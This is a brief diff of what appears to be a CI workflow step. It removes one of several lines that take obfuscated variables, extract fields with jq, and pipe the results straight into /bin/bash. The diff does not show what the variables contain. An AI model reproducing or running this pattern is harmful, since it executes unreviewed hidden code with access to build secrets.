@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$cldgp2" | jq -r .dxd8 | /bin/bash
           printf '%s' "$dc4" | jq -r .vhq7054 | /bin/bash
-          echo $ncqlj736 | jq -r .lt572 | /bin/bash
           echo $e8 | jq -r .us86 | /bin/bash
           echo $tt14287 | jq -r .qj98026 | /bin/bash
           echo $xupi317 | jq -r .ujezj9963 | /bin/bash
